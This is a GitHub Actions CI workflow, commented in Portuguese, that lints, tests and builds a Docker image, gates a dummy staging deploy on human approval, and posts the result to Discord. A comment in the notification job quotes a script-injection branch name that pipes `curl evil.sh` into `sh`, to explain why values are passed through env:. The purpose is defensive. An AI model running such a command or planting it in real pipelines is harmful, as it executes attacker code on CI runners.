# ABOUTME: Pipeline de CI: os portões de qualidade que bloqueiam o merge e, depois, o build e a publicação da imagem.
# ABOUTME: Roda em todo pull request para a main e em todo push que chega na main.
#
# Referência: docs/ci-pipeline.md

name: CI

# Três gatilhos, cada um com um papel diferente:
#   - pull_request: é isto que transforma o CI num PORTÃO de merge de verdade.
#   - push na main: mantém o badge do README honesto sobre a saúde da main.
#   - push de qualquer tag: uma tag é candidata a release, então passa pelos
#     mesmos portões e, quando eles aprovam, a imagem sai com o nome da tag.
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]
    tags: ['*']

# Menor privilégio: o GITHUB_TOKEN deste workflow só consegue LER o repositório.
# Sem este bloco, o token viria com contents: write por padrão. O job que
# precisar de mais pede explicitamente, um job de cada vez.
permissions:
  contents: read

# Só a execução mais recente de cada branch interessa. Um push novo cancela a
# execução anterior em vez de entrar na fila atrás dela, e o retorno no pull
# request continua rápido.
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

env:
  # Versão usada pelos jobs que não precisam da matrix inteira.
  DEFAULT_PYTHON_VERSION: '3.12'

jobs:
  lint:
    name: Lint (ruff)
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
        with:
          python-version: ${{ env.DEFAULT_PYTHON_VERSION }}

      - name: Cache pip downloads
        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9  # v6.1.0
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-lint-${{ hashFiles('requirements*.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-lint-

      - name: Install dev dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements-dev.txt

      # A configuração fica no pyproject.toml, então este mesmo comando produz
      # exatamente o mesmo resultado na máquina de quem desenvolve e aqui.
      - name: Run ruff
        run: ruff check .

  # A MATRIX fica aqui, no chamador. Os STEPS de teste ficam no workflow
  # reutilizável. Um job que chama um reusable não tem runs-on nem steps: quem
  # executa steps é o reusable. Esquecer disso é o erro mais comum.
  #
  # security-events: write é concedido aqui porque o reusable envia o relatório
  # SARIF do Trivy para a aba Security.
  #
  # As versões testadas saem da variable PYTHON_VERSIONS do repositório
  # (Settings > Secrets and variables > Actions > Variables), então ampliar ou
  # reduzir a cobertura não exige commit. O literal depois do || é valor de
  # reserva: sem ele, um clone deste repositório sem a variable cadastrada
  # quebraria no fromJSON de uma string vazia.
  test:
    permissions:
      contents: read
      security-events: write
    strategy:
      fail-fast: false
      matrix:
        python-version: ${{ fromJSON(vars.PYTHON_VERSIONS || '["3.10", "3.11", "3.12"]') }}
    uses: ./.github/workflows/_reusable-test.yml
    with:
      python-version: ${{ matrix.python-version }}

  # Constrói a imagem da aplicação e publica no Docker Hub. O needs: [lint,
  # test] é o ponto central: se qualquer portão reprovar, este job é pulado —
  # uma imagem que falhou num scan ou num teste nunca chega ao registry.
  #
  # As tags seguem o docs/ci-pipeline.md:
  #   pull request -> PR-<número>
  #   push na main -> latest
  #   push de tag  -> a própria tag
  # mais o hash curto do commit em toda build, que permite rastrear um pod em
  # execução até o commit exato de onde ele saiu.
  push:
    name: Build and push image
    needs: [lint, test]
    runs-on: ubuntu-latest
    env:
      IMAGE_NAME: app-k8s-todolist
      # Lido uma vez no nível do job para que os steps abaixo possam testá-lo
      # no if:, onde o contexto secrets não existe.
      DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
    steps:
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1

      # Todo valor chega ao shell por env:, como no job notify, para que um nome
      # de branch ou de tag não consiga injetar comandos. Num evento
      # pull_request o github.sha é o commit de merge temporário, então o hash
      # curto vem do topo da branch em revisão.
      #
      # Tag de Docker só aceita letra, dígito, ponto, traço e sublinhado:
      # qualquer outro caractere do nome da tag do git vira traço.
      - name: Compute image tags
        id: tags
        env:
          EVENT_NAME: ${{ github.event_name }}
          REF_TYPE: ${{ github.ref_type }}
          REF_NAME: ${{ github.ref_name }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          SHA: ${{ github.event.pull_request.head.sha || github.sha }}
        run: |
          image="${DOCKERHUB_USERNAME:-local}/${IMAGE_NAME}"
          if [ "$EVENT_NAME" = "pull_request" ]; then
            main_tag="PR-${PR_NUMBER}"
          elif [ "$REF_TYPE" = "tag" ]; then
            main_tag=$(printf '%s' "$REF_NAME" | tr -c 'A-Za-z0-9_.-' '-')
          else
            main_tag="latest"
          fi
          short_sha="${SHA:0:7}"
          {
            echo "tags<<TAGS_EOF"
            echo "${image}:${main_tag}"
            echo "${image}:${short_sha}"
            echo "TAGS_EOF"
            echo "image_tags=${main_tag},${short_sha}"
          } >> "$GITHUB_OUTPUT"
          echo "Image tags: ${main_tag}, ${short_sha}"

      # A mesma proteção do notify: sem credencial do Docker Hub — num pull
      # request vindo de um fork, ou num clone deste repositório — a imagem
      # ainda é construída, o que prova que o Dockerfile funciona, mas não é
      # publicada.
      - name: Log in to Docker Hub
        if: env.DOCKERHUB_USERNAME != ''
        uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f  # v4.6.0
        with:
          username: ${{ env.DOCKERHUB_USERNAME }}
          password: ${{ secrets.DOCKERHUB_TOKEN }}

      # O Buildx é o construtor por trás do build-push-action, e é ele que
      # consegue guardar as camadas da imagem no cache do GitHub Actions.
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e  # v4.3.0

      # IMAGE_TAGS é o build-arg que o Dockerfile transforma no rodapé da
      # aplicação: um pod em execução mostra de qual build ele veio.
      #
      # type=gha guarda as camadas no cache do GitHub Actions: quando só o
      # app.py muda, a camada de dependências é reaproveitada em vez de
      # reconstruída.
      - name: Build and push
        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a  # v7.3.0
        with:
          context: .
          push: ${{ env.DOCKERHUB_USERNAME != '' }}
          tags: ${{ steps.tags.outputs.tags }}
          build-args: |
            IMAGE_TAGS=${{ steps.tags.outputs.image_tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  # Deploy simulado, cujo propósito real é o portão de aprovação humana. O
  # environment staging está configurado com required reviewers, então este job
  # aparece como "Waiting" e fica parado até alguém aprovar em Review
  # deployments. A aprovação fica registrada no histórico de deployments do
  # repositório: auditoria de graça.
  #
  # O needs inclui push, então staging só recebe um commit cuja imagem já está
  # no Docker Hub.
  #
  # O if: restringe a um push na main: implantar a cada pull request não faria
  # sentido, e os revisores seriam chamados para aprovar o tempo todo.
  #
  # NÃO marque este job como required status check: ele nunca roda em pull
  # request, e um check obrigatório que nunca reporta trava todo merge.
  deploy-staging:
    name: Deploy to staging (dummy)
    needs: [lint, test, push]
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: staging
    steps:
      - name: Simulate deployment
        run: |
          echo "Deploying commit ${{ github.sha }} to staging"
          echo "Target: ${{ secrets.STAGING_URL }}"

  # Job de notificação. O if: always() é obrigatório aqui: um job que dependa
  # do sucesso dos anteriores nunca dispararia numa falha — que é exatamente
  # quando o time precisa ser avisado.
  notify:
    name: Notify pipeline result
    needs: [lint, test, push, deploy-staging]
    if: always()
    runs-on: ubuntu-latest
    steps:
      # Como um step entrega um valor para outro step: acrescentando linhas
      # `nome=valor` ao arquivo cujo caminho o runner expõe em $GITHUB_OUTPUT. O
      # `id:` abaixo é o que torna esses valores endereçáveis como
      # steps.msg.outputs.<nome> do próximo step em diante.
      #
      # O deploy-staging fica skipped em pull request, e o push fica skipped
      # sempre que um portão reprova: por isso "skipped" conta como neutro nos
      # dois. Tratar como falha faria todo pull request reportar pipeline
      # vermelho — e um portão reprovado já deixa o card vermelho sozinho.
      - name: Compose message
        id: msg
        env:
          LINT_RESULT: ${{ needs.lint.result }}
          TEST_RESULT: ${{ needs.test.result }}
          DEPLOY_RESULT: ${{ needs.deploy-staging.result }}
          PUSH_RESULT: ${{ needs.push.result }}
          EVENT_NAME: ${{ github.event_name }}
          REF_TYPE: ${{ github.ref_type }}
          # Em pull request, o github.ref_name é `2/merge`: a ref interna de
          # merge, não uma branch que alguém reconheça. O head_ref carrega a
          # branch de origem de verdade e fica vazio fora de pull request, então
          # o || cobre push e tag.
          BRANCH: ${{ github.head_ref || github.ref_name }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          SUBJECT: ${{ github.event.pull_request.title || github.event.head_commit.message }}
        run: |
          # Um ícone por resultado de job: o card se entende antes de ser lido.
          icon() {
            case "$1" in
              success)   printf '✅' ;;
              failure)   printf '❌' ;;
              cancelled) printf '🚫' ;;
              skipped)   printf '⏭️' ;;
              *)         printf '⚪' ;;
            esac
          }

          if [ "$LINT_RESULT" = "success" ] \
             && [ "$TEST_RESULT" = "success" ] \
             && { [ "$PUSH_RESULT" = "success" ] || [ "$PUSH_RESULT" = "skipped" ]; } \
             && { [ "$DEPLOY_RESULT" = "success" ] || [ "$DEPLOY_RESULT" = "skipped" ]; }; then
            # O Discord quer a cor do embed como inteiro decimal:
            # 3066993 é #2ECC71 (verde), 15158332 é #E74C3C (vermelho).
            status=SUCCESS; status_icon='✅'; color=3066993
          else
            status=FAILURE; status_icon='❌'; color=15158332
          fi

          # O que disparou a execução, dito como uma pessoa diria.
          case "$EVENT_NAME" in
            pull_request) trigger="Pull request #${PR_NUMBER}" ;;
            *) if [ "$REF_TYPE" = "tag" ]; then
                 trigger="Tag ${BRANCH}"
               else
                 trigger="Push to ${BRANCH}"
               fi ;;
          esac

          {
            echo "status=$status"
            echo "status_icon=$status_icon"
            echo "color=$color"
            echo "trigger=$trigger"
            echo "lint=$(icon "$LINT_RESULT") $LINT_RESULT"
            echo "tests=$(icon "$TEST_RESULT") $TEST_RESULT"
            echo "image=$(icon "$PUSH_RESULT") $PUSH_RESULT"
            echo "deploy=$(icon "$DEPLOY_RESULT") $DEPLOY_RESULT"
            # Só a primeira linha da mensagem do commit, cortada para caber no embed.
            echo "subject=$(printf '%s' "$SUBJECT" | head -n 1 | cut -c1-120)"
          } >> "$GITHUB_OUTPUT"

      # Todo valor que o payload precisa chega por env:, e o shell lê como
      # $VAR. Escrever ${{ ... }} direto num bloco run: colaria o valor no TEXTO
      # do script antes de o shell existir: uma branch chamada
      # `x";curl evil.sh|sh;"` seria executada — a injeção de script clássica do
      # Actions. Passando por env:, o valor é apenas dado.
      #
      # O jq monta o JSON em vez de concatenar string, então uma aspa ou um
      # acento num nome de branch não geram um corpo malformado. O jq já vem
      # instalado nos runners Ubuntu hospedados pelo GitHub.
      #
      # A proteção fica no STEP, não no job, porque o contexto secrets não está
      # disponível num if: de job. Sem ela, um clone deste repositório sem
      # webhook cadastrado falharia num curl vazio.
      - name: Send Discord notification
        if: env.WEBHOOK_URL != ''
        env:
          WEBHOOK_URL: ${{ secrets.NOTIFY_WEBHOOK_URL }}
          REPO_URL: ${{ github.server_url }}/${{ github.repository }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
          ACTOR_URL: ${{ github.server_url }}/${{ github.actor }}
          AVATAR_URL: ${{ github.server_url }}/${{ github.actor }}.png?size=64
          # Em pull_request, o github.sha é o commit de merge descartável que o
          # runner cria em refs/pull/N/merge: não pertence a branch nenhuma, e um
          # link para ele cai numa página de commit órfão. O head.sha é o topo da
          # branch em revisão, que é o commit que quem lê espera. O || cobre push
          # e tag, onde head.sha não existe.
          SHA: ${{ github.event.pull_request.head.sha || github.sha }}
          REPO: ${{ github.repository }}
          ACTOR: ${{ github.actor }}
          RUN_NUMBER: ${{ github.run_number }}
          STATUS: ${{ steps.msg.outputs.status }}
          STATUS_ICON: ${{ steps.msg.outputs.status_icon }}
          COLOR: ${{ steps.msg.outputs.color }}
          TRIGGER: ${{ steps.msg.outputs.trigger }}
          SUBJECT: ${{ steps.msg.outputs.subject }}
          LINT: ${{ steps.msg.outputs.lint }}
          TESTS: ${{ steps.msg.outputs.tests }}
          IMAGE: ${{ steps.msg.outputs.image }}
          DEPLOY: ${{ steps.msg.outputs.deploy }}
        run: |
          # Manchete do card: o que mudou, qual commit, o que disparou.
          # As crases abaixo são Markdown do card do Discord, não substituição de
          # comando — daí a exceção do ShellCheck SC2016.
          # shellcheck disable=SC2016
          # A URL do commit é montada aqui para que SHA continue sendo a fonte
          # única de verdade tanto do link quanto do texto ao lado dele.
          description=$(printf '**%s**\n[`%s`](%s/commit/%s) · %s' \
            "$SUBJECT" "${SHA:0:7}" "$REPO_URL" "$SHA" "$TRIGGER")

          jq -n \
            --arg     title     "${STATUS_ICON} CI ${STATUS} · ${REPO}" \
            --arg     desc      "${description}" \
            --argjson color     "${COLOR}" \
            --arg     url       "${RUN_URL}" \
            --arg     actor     "${ACTOR}" \
            --arg     actor_url "${ACTOR_URL}" \
            --arg     avatar    "${AVATAR_URL}" \
            --arg     lint      "${LINT}" \
            --arg     tests     "${TESTS}" \
            --arg     image     "${IMAGE}" \
            --arg     deploy    "${DEPLOY}" \
            --arg     footer    "Run #${RUN_NUMBER} · ${REPO}" \
            --arg     ts        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
            '{embeds: [{
                title:       $title,
                description: $desc,
                color:       $color,
                url:         $url,
                timestamp:   $ts,
                author: {name: $actor, url: $actor_url, icon_url: $avatar},
                fields: [
                  {name: "Lint (ruff)",    value: $lint,   inline: true},
                  {name: "Tests (matrix)", value: $tests,  inline: true},
                  {name: "Docker image",   value: $image,  inline: true},
                  {name: "Deploy staging", value: $deploy, inline: true}
                ],
                footer: {text: $footer}
              }]}' \
          | curl -sS --fail-with-body \
                 -X POST -H 'Content-Type: application/json' \
                 -d @- "$WEBHOOK_URL"
